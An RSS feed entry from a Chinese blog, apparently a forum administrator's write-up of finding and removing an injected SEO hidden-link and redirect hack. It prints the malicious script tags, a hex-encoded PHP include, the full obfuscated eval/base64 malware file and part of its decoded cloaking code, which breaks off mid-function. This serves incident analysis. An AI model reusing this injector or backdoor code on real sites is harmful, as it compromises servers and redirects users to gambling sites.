<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>security - 看看俺 – KanKanAn.com</title>
        <description>记我所思，忆我所为。</description>
        <link>http://blog.kankanan.com/tag/security.xml</link>
        <lastBuildDate>Fri, 18 Dec 2015 07:32:03 GMT</lastBuildDate>
        <docs>http://blogs.law.harvard.edu/tech/rss</docs>
        <image>
            <title>security - 看看俺 – KanKanAn.com</title>
            <url>http://blog.kankanan.com/static/favicon.ico</url>
            <link>http://blog.kankanan.com/tag/security.xml</link>
        </image>
        <copyright>版权所有 © 2011-2015 看看俺 – KanKanAn.com</copyright>
        <generator>Feed for Node.js</generator>
        <category>技术</category>
        <item>
            <title><![CDATA[论坛被挂暗链问题分析与解决]]></title>
            <link>/article/8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html</link>
            <guid>/article/8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html</guid>
            <pubDate>Tue, 01 Apr 2014 13:38:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">发现问题</h2>
<div class="outline-text-2" id="text-1">
<p>
有网友反映我们的论坛被挂了暗链，具体表现为从 <code>google</code> 搜索论坛名称结果如下图所示：
</p>


<div class="figure">
<p><img src="../static/site_attacked.png" alt="site_attacked.png" />
</p>
</div>

<p>
直接搜索论坛网址出现的一些热门帖子也被挂了暗链，通过 <code>google</code> 搜索结果访问会跳到恶意网站，
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">解决问题</h2>
<div class="outline-text-2" id="text-2">
<p>
直接通过网址访问论坛则没有任务问题，应该是论坛被注入了恶意代码，一时没被发现。
</p>

<ul class="org-ul">
<li>在代码和数据库dump结果中搜索恶意站点信息，一无所获
</li>

<li>然后怀疑是用户上传的图片中挂了马，特别是联想到首页最近刚上热图轮播，安装 <code>firefox</code> 插件 <code>ImageBlock</code> 让浏览器不加载图片，可是问题依旧
</li>

<li>打开 <code>firebug</code> 的 <code>Network</code> 标签，在页面加载记录中发现一个异常的js加载： <code>http://api.discuz.com.de/Seo.js</code> 

<p>
在代码和数据库中搜索这个js找不到任何信息。
</p>

<ul class="org-ul">
<li>将恶意站点配置一条 <code>hosts</code> 

<pre class="example">
127.0.0.1 api.discuz.com.de
</pre>
</li>
</ul>
<p>
浏览器不再自动跳转到恶意网站了。 
</p>
</li>

<li>从 <code>google</code> 跳转到论坛后，查看页面源代码在最开始部分发现了引入恶意js的语句

<div class="org-src-container">

<pre class="src src-html">&lt;<span style="color: #f99157;">div</span> <span style="color: #ffcc66;">style</span>='display:none'&gt;&lt;<span style="color: #f99157;">script</span> <span style="color: #ffcc66;">language</span>='javascript' <span style="color: #ffcc66;">src</span>='http://count31.51yes.com/click.aspx?id=310940343<span style="color: #ffcc66;">&amp;logo</span>=1' <span style="color: #ffcc66;">charset</span>='gb2312'&gt;&lt;/<span style="color: #f99157;">script</span>&gt;&lt;/<span style="color: #f99157;">div</span>&gt;&lt;<span style="color: #f99157;">script</span> <span style="color: #ffcc66;">type</span>='text/javascript' <span style="color: #ffcc66;">src</span>='http://api.discuz.com.de/Seo.js'&gt;&lt;/<span style="color: #f99157;">script</span>&gt;
</pre>
</div>
</li>

<li>在php脚本中加入 <code>echo</code> 语句逐步缩小范围，最终发现问题由下面一条语句引起

<div class="org-src-container">

<pre class="src src-php"><span style="color: #99cc99;">INCLUDE</span>(<span style="color: #cccccc; background-color: #2d2d2d;">pack(</span><span style="color: #66cccc;">'H*'</span>,<span style="color: #66cccc;">'2f7661722f746d702f2e53595344554d502f2e576830416d492e434f5245'</span><span style="text-decoration: underline;">));</span>
</pre>
</div>

<p>
上面的语句引入了 <code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code> 脚本。
</p>

<p>
删除该语句后问题解决。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">分析恶意代码</h2>
<div class="outline-text-2" id="text-3">
<ul class="org-ul">
<li><code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #cc99cc;">&lt;?php</span> $<span style="color: #ffcc66;">O00OO0</span>=<span style="color: #cccccc; background-color: #2d2d2d;">urldecode(</span><span style="color: #66cccc;">"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2</span><span style="color: #66cccc; text-decoration: underline;">A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A"</span><span style="text-decoration: underline;">);$</span><span style="color: #ffcc66; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">=$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">3</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">6</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">33</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">30</span><span style="text-decoration: underline;">};$</span><span style="color: #ffcc66; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">=$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">33</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">10</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">24</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">10</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">24</span><span style="text-decoration: underline;">};$</span><span style="color: #ffcc66; text-decoration: underline;">OO0O00</span><span style="text-decoration: underline;">=$</span><span style="color: #ffcc66; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">0</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">18</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">3</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">0</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">1</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">24</span><span style="text-decoration: underline;">};$</span><span style="color: #ffcc66; text-decoration: underline;">OO0000</span><span style="text-decoration: underline;">=$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">7</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">13</span><span style="text-decoration: underline;">};$</span><span style="color: #ffcc66; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">.=$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">22</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">36</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">29</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">26</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">30</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">32</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">35</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">26</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffcc66; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">30</span><span style="text-decoration: underline;">};</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">eval(</span><span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">(</span><span style="color: #66cccc; text-decoration: underline;">"JE8wTzAwMD0idVJKalF2d2xZRHBIS29Vc2tBZG1pQlphTkdxeEZoQ1hUZ09MY1Z0RVd5Yk1Jcm56UGVTZklUak95VnFVZmdDZWx1SndkQldzUXpTbnRLeExrUEVtRnBYTWJhaFJ2SGlBR1lyY05vWkROZzlxbmVCdEVROHhneXV4Zm1hMG5LOUhYcld1aTJraG55MGxsUUJwSmFScEdndTBYZ2RIQWdKM2d5dXhNcTBsU21qSGkzakRic2FxaTNqMG52NXJsZ0JDWHEwbGpLU0NpS2FSbm1HcE5aQnJNM1NQYlE5MGltQlZNVXRTSjBUYUZhQlZqY3d0RVFUakpnMGRtMXRrSlVTa0pVd3JKZGF0RjFUa20wa1JUa0dybUZ3dEVRVEVpM3k5ams5RlRhanZUYWppajBQSmFrekRhYXRrSlU5elQwYVhhRVdXWHEwbGpralVTTzBkbTF0a0pVU2tKVXdyWmtUSkprOVpUSlNrSmRhWmoxMDdneXVkWjBVeU52a0hic2s1bEViTEFGYklBT3BJQU9KMU1PQTNqSHFyQUZSMk1PSjFNT0cwQVo0SHRFYndqY1JIdFo0MnRFNDV0RTRIQUZkck1FYkxBRmRJQUZ5M01PUkx0RTRIQUZBck1FYkxBRnBJQUZHSE1PUjRYRTRMWEZ5ck1FYjJBRTRMdGNHSUFPRzVNT2ZMakhxcnRPUklBRnA0TU9BNU1PUjJqSHFydE9SSUFGeTNNT2Q0TU9SNVhFYndqY2ZMTU9SSFhaNDB0WjQzQVFid2pjUkxBSDQ1WEU0SHRGeUlBT3kxakhxcnRGcElBT0dMTU9mTE1PUkhYRWJ3amNSTHRINGN0RTQzQUg0M0FFYndqY0o0TU9HTHRaNExYRkJJWGd5ck1FYkxBRmJJQU9wSUFPSjFNT0pjakhxckFGcGNNT2RMTU95cU1PUjB0RWJ3amNSTHRINEhBWjRIQU9CSUFPeTFqSHFyQUZHSE1PR0hYRTRIQWdCSXRnZnJNRWIyQVo0THRPeUlBRkpxTU9icWpIcXJ0T1JJQUZ5M01PUnFYRTQwQVpid2pjUkx0UTQxdFo0SHRnR0lBRkE0akhxckFGUjBNT3BxTU9HSEFRNEh0Z0dyTUViMkFaNEx0Z2JJQUZCNE1PeUxqSHFyQUZSMk1PRzF0WjRIQWNCSXRjQnJNRWJIQU9HSUFGcDJNT0cwTU9HMmpIcXJBT0dITU9SNHRRNEh0RTQxWFpid2pjR0hBRTRMWGdSSUFGSjRNT1JxdFFid2pjUkhBSDRMQU9KSUFGZnFNT0dMdFpiQ1hxMGxqUmhFaTN5OWZtakhmbWR1ajBqUG52VDFiM3pDU0thSGpIcXJUMjlWUzJMVWZzOTBqSHFydnZrdWkyOHJNRVdFbnY1cmZzOTBqSHFySjI5Y2kzdHFudlRVYlFid2oxdFZTMjkxakhxckFjZnFKM3pDU0thSGpIcXJ2djkxU0trVnlzOTBqSGQ3Z3l1ZFoyYTVOdmtIYnNrNWxFV1BpcmsxZnY0SWkzanJqSHFyUzI5VlMyTFVNc3RWaVpid2ozdFZiMjhJZjI5aGpIcXJqdko0anZHMWpGUE9qSHFyanZKNWp2a1Bqdkdxakhxcmp2SjVqdkdManZqT2pIcXJqdkozakZwNWpGVVFqSHFyanZKMWpGUGRqRlVQanZKMWp2amRqdlI1akhxcmp2SjNqRmQ1anZqVWp2SjFqdmtVanZHMmpIcXJqdkoyanZSY2pGUFFqdkozakZwNWpGUE9qSHFyanZKMmp2RzRqdkc0anZKMmpGcDRqRlBzakhxcmp2SjFqdlI0anZHTGp2SjBqdkc1akZkcWpIcXJqdkoxakZVUWp2amRqdko1akZkNWpGcDFqSHFyanZKM2pGVU9qRlVzanZKMGp2alBqdmpQakhxcmp2SjNqRlVPakZVc2p2SjVqRmRIanZHTGpIcXJqdkozakZQVWp2R3Fqdko1akZwM2pGZExqSHFyanZKMmp2R2NqdlI0anZKMWpGcDJqRlBPakhxcmp2SjFqdmpPakZwcWp2SjJqRnA0anZHM2pIcXJqdkoxanZqZGp2UjVqdko1akZwM2pGZExqSHFyanZKNGp2RzFqRlVQanZKNWpGZEhqdkdMakhxcmp2SjJqRlBzakZkcWp2SjNqRlBVanZHcWpIcXJqdkozanZrZGpGZDJqdkozakZkMWp2UjFqSHFyanZKNGp2a3NqRmQxanZKM2pGUFVqdlI1akhxcmp2SjFqdkc1anZHY2p2SjFqRlBzanZHcWpIcXJqdkoxanZSMGp2a1Bqdko1akZkNGp2R2NqdkoxakZVc2pGUFVqSHFyanZKMGp2amRqRmRjanZKNWp2a1BqRlBPanZKNWpGcDNqRmRMakhkN2d5Q3NXdjVPV0tVVmlRemRTdkFxU0tKdWpLU0NpS2FSbm1Hd2pLVFBXS1JDb3EwbGpLVFBXS2t6YnJHcE5aelVvZXp3aTJUVWxFYjZqSHFkU0trMGZaZDdneXVqalJoVW9tQXBOWnpVb2V6d2kyVFVsRWI2akhMUWZtdFV0T1REU0thT2kyVFVsZXQwYlU5SGkzeUxBSFBxZnZ0WWxFV0dsUWJ3aktUUFdLa3picmppQWswQ2xaZENYcTBsRVpUWFNtV2NHZzBwU21QcWlLOWRTWnByWFFid2Zza2NTRmYwbTJUVWYyOWRTWlBjV2VqRGJzOTBBRkF1YktrT25IcHJaRXVyTUVUZGZtVFB5bWpIdmNrV2xaZENsRnd0RXBkZEZLVUluM0E5R0thNGJLTFZTS0p1amN1ck1LalBiMkoydGs5ZFN2dFZTS0p1YjNUSG0zalZXZ1JjbGV6UGYyd3VqMHB4akhxZFNLazBmSmtIYlV3SG1aZENsWmQ3Z3l1anlLVUlmMkwxU0tKdWpLU0NpS2FSbm1HSWpINW1uZ3p6aUpkSUZKOVJUSnFybEZoZG52SjdneUM5Z3lDc1d2NU9XS1VWaVF6clNtVGRmbVRQbEVUZGZtVFBtM2FIaUVVN2d5Q0NTUUJ1U3JhSWYzVENpMjVEU21QQ2IzVGNsRVdPV21qd20yYTRTdkFybFpkcG9xMGxqZXRxbTJ0MWJzcXBOWnpCZjNhSGlrOUNpc1UwbEVkN2d5Q09XbWp3bTN0VVdLOXFXRXBkYjN6RGYzYUhpRXFweTFhWkZSOXlhazlhSmRxd0dFVGRmbVRQbTNhSGlFZDdneUNPV21qd20zdFVXSzlxV0VwZGIzekRmM2FIaUVxcHkxYVpGUjl5YWs5R1RKa1JUYUd3R2dCQ1hxMGxmM2FIaWs5Y1NtVFZiZXl1amV0cW0ydDFic3F3R1J0YUpkTE5Ka1REeTA5WEZkYWdha1RqRkphTmFheXdHZ0pDWHEwbGYzYUhpazljU21UVmJleXVqZXRxbTJ0MWJzcXdHUnRhSmRMTkprVERKZGFKYWFqWGFranpGVXRLVGFHd0dnUkNYcTBsakt0VmlyVFVpclRjR2cwcHlLdDFic0xEU21QVWZIcGRiM3pEZjNhSGlFZDdneUNCZjNhSGlrOU9pSzljU1pwZGIzekRmM2FIaUVkN2d5QzlTdkxjU3ZVc2xLUzFpc3QwbnY5SW0yYTRubXQwYkhwcmIzVEhTdmtobTJ0VmlyVFVvZVREZjNqVWZtVFVqSGRDR2V3dEVRVGNiazlPaTI1MEdnMHBmbWpIZm1kdWoyUDBXZUJyR2cwK0dLa0hic2s1bEVXaFNtVHVpMnlyR2cwK0dFV2VUYXlyTUVXMG52MVVpM2EwakhCOU5RQjFsWmQ3Z3l1ZGIzekRiM1RIU1pCOUdSemNXZWpVZnYxRGYyOUlXS2E0V2s5T2JzYVBXS0p1amV0cW0ydFZpcnlDWHEwbGpLdFZpclRVaXJUY0dnMHB5S1NDaUthRFMyYTBtMnRWaXJUVWlyVGNsRVRkZm1UUG0zYUhpRXFwU3Nrd2IySndHRVRjYms5Y1dlalVsRnd0RXIxVWlldFVvcTBsaktQUGlzVHdTWkI5R1J6c2kzelVpUXBkU0trMGZhOTFic3F3R0VqSGZRR0NYSEJ0RVFUT2kyNTBTdjUwYkhCOUdSemNXZWpVZnYxRFMyYTBtMnRWaXJUVWlyVGNsRVR1ZnY1ZGlLSkNYSEJ0RWR6c2YyTFZiMkp1aktQUGlzVHdTWmQ3Z3lDOWd5Q0hTbVQxYnM0cGpLdFZpclRVaXJUY1hxMGxEeTBsU3JhSWYzVENpMjRwYjJQVldIcGRTc1V3U0pUQ2JRVTdneXVkU3NVd1N2NVBpdko5aktTQ2lLYVJubUdJaXZ5MWxFVERKMGFaYWRhWnZIV0dha1R5bTBQTkoxeXJtWjRkbTF0a0pVU2tKVXdySmRhVGFKYUZhazlhSmRkcm1aZDdneUNDU1FQQ2IxOXNudkxVbEVUc252TFVpc2toU1pkQ29xMGxFWlRzYmcxQlNzOXFTdjR1aktTQ2lLYUlmdjFVTUVXSGpIZDdneXVqaktUUFdLUjl5S1NIU3ZrZGxFVHNiRUxzbnZMVWIyVTZTWnBkU3NVd1N2NVBpdkpDbEZ3dEVwVUJTc3R3aTN0VWxFVHNiRWQ3Z3l1am52ZnVTdjFxV2VkdWpLVFBXS1JDbFp6N3llYUlpS1VJbkhwZFNzVXdTdjVQaXZKQ1gzalVXZWFIaU9oOWd5dWpTS2FPQUtUVWxFVHNudkxVVEtVSE1FVGRmbVRQbEZ3dEVyMHBTdkxjU1p6N2d5dWpqS1RQV0tSOVMyYTBTS2swZlpwcm5lVDBiZ3VWTTJqVVdFNWRubXRPV211SWYyOWhNc1RVTTNicWIyUENGMjgzTXJ6dWJnOUdGMXRKTlpiSWprOUZUYWp2VGFqaWowUEpha3pEWlI5RmFFV1dsRnd0RXBkZFNyQjl5S1NWYkthSWxFVHNudkxVaXNraFNacXJXSGJDWHEwbEVKenNXM2pDV0tKdWpLU3FNRVRkZm1UUGxGd3RFcFVCU3N0d2kzdFVsRVRzYkVkN2d5dWpudmZ1YjNUSGlLYUlsRVRkZm1UUGxaQitHZ1JxQWdCQ0dld3RFcFVkU3ZBcVNLSnVqS1NDaUthUm5tR3dqS1RQV0tSQ1hxMGxFbTB0RXIxOWd5Q0NTUXBQbnY1RGZtakhmbWR1alJVeU1FVE1aYUJDbG13dEVzU1Zic2FQZjJwdWpSaEVpM3lwZm1BcGpSaEVpM1RjbG1oQ1NRUGNXZWpDYjNUSGxFVEVpM3l3alJoRWkzVGNsWlU3Z3lDY25LOTNsRVRzbnZMVVRLVUhsRnd0RXIxOVNzOUhTdmtPbkVwZFoyYTVHS2tjR0VUTVNtVWNsbXd0RXNVc2xldDBic1VjV2VHdWpralVTUXFkWjJhNWJIZENvcTBsU3Z0dWlIQlFOS1RDV1F6Y1dlVXdTRjByU0tVY2JLTFBvRkNJaTI1VWpjNDhiMnRIbm16MEdLTFBpc1cxZnZXVU5aV3hmbVNQYjJ0SG5tejBqSHpjYnNBOWoyUDBXZUI2TUg5T2kzYUlXZ0FMTU9KTG92YWNNc3RWaVo5T2lLVU9uSDVQYjN6NE4yVWRORkFMQWdkMEFnQTBBSFN3aTJXVk5GUnJHS3R1Zm1qY1NteTlqMldRQU9BTEFRYitORTljZjNqQ2JleStORTlkbm1mK05ldE9ic1VxV0V6MG9telVOWlcwU21QME0yQ1BXc2tjZjNqQ2JleXJHZXRIZmMwcm5lVDBiZ3VWTTJrcW5aNWRubXRPV211SWYyOWhNc1RVTTF0VWlINXhiSGIrTkU5Y2YzakNiZXkrR09oOURtMHRFcD09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="</span><span style="text-decoration: underline;">));</span><span style="color: #cc99cc; text-decoration: underline;">?&gt;</span>
</pre>
</div>
</li>

<li>参考 <a href="http://blog.i1728.com/post/99.html">网上方法</a> 解码的结果

<div class="org-src-container">

<pre class="src src-php"><span style="color: #cc99cc;">&lt;?php</span>
<span style="color: #999999; font-style: italic;">/*</span>
<span style="color: #999999; font-style: italic;">*author:whoami</span>
<span style="color: #999999; font-style: italic;">*  QQ  :4892057</span>
<span style="color: #999999; font-style: italic;">*/</span>
<span style="color: #cccccc; background-color: #2d2d2d;">error_reporting(0</span>);
$<span style="color: #ffcc66;">fileDir</span> = <span style="color: #66cccc;">'/var/tmp/.SYSDUMP/'</span>;
$<span style="color: #ffcc66;">IP</span>=$<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'REMOTE_ADDR'</span>];
$<span style="color: #ffcc66;">Bot</span>=$<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'HTTP_USER_AGENT'</span>];
$<span style="color: #ffcc66;">Ref</span>=$<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'HTTP_REFERER'</span>];
$<span style="color: #ffcc66;">KIP</span>=<span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'117.28.255.37'</span>,<span style="color: #66cccc;">'116.55.241.24'</span>,<span style="color: #66cccc;">'125.64.94.219'</span>,<span style="color: #66cccc;">'119.147.114.213'</span>,<span style="color: #66cccc;">'11</span><span style="color: #66cccc; text-decoration: underline;">8.122.188.194'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'60.172.229.61'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'61.188.39.16'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'61.147.98.198'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'61.129.45.72'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'113.98.254.245'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'58.221.61.128'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'117.34.73.70'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'58.215.190.84'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'117.28.255.53'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'183.91.40.144'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'117.21.220.245'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'122.228.200.46'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'61.164.150.70'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'61.147.108.41'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'116.55.242.138'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'114.80.222.242'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'61.147.108.41'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'116.255.230.70'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'222.186.24.26'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'222.186.24.59'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'220.181.158.106'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'123.125.160.215'</span><span style="text-decoration: underline;">);</span>
$<span style="color: #ffcc66;">KBot</span>=<span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'Baiduspider'</span>,<span style="color: #66cccc;">'Googlebot'</span>,<span style="color: #66cccc;">'Yahoo'</span>,<span style="color: #66cccc;">'Bingbot'</span>,<span style="color: #66cccc;">'Sosospider'</span>,<span style="color: #66cccc;">'Sogou'</span>,<span style="color: #66cccc;">'36</span><span style="color: #66cccc; text-decoration: underline;">0Spider'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'YoudaoBot'</span><span style="text-decoration: underline;">);</span>
$<span style="color: #ffcc66;">Key</span>=<span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'anquan.org'</span>,<span style="color: #66cccc;">'google.com'</span>,<span style="color: #66cccc;">'soso.com'</span>,<span style="color: #66cccc;">'%e8%b5%8c'</span>,<span style="color: #66cccc;">'%e9%aa%b0'</span>,<span style="color: #66cccc;">'%e9%b1%</span><span style="color: #66cccc; text-decoration: underline;">bc'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e7%89%9b'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e5%8d%9a%e5%bd%a9'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e7%99%be%e5%ae%b6'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e6%a3%8b%e7%89%8c'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e6%b8%b8%e6%88%8f'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e5%a8%b1%e4%b9%90'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e5%9b%bd%e9%99%85'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e7%9c%9f%e4%ba%ba'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e7%9c%9f%e9%92%b1'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e7%8e%b0%e9%87%91'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e6%b3%a8%e5%86%8c'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e5%bc%80%e6%88%b7'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e5%bd%a9%e9%87%91'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e8%b5%9a%e9%92%b1'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e6%8f%90%e7%8e%b0'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e7%ad%96%e7%95%a5'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e8%af%95%e7%8e%a9'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e5%b9%b3%e5%8f%b0'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e5%a4%aa%e9%98%b3%e5%9f%8e'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'%e4%bd%93%e9%aa%8c%e9%87%91'</span><span style="text-decoration: underline;">);</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">dec0de</span>($<span style="color: #ffcc66;">fileDir</span>,$<span style="color: #ffcc66;">data</span>){
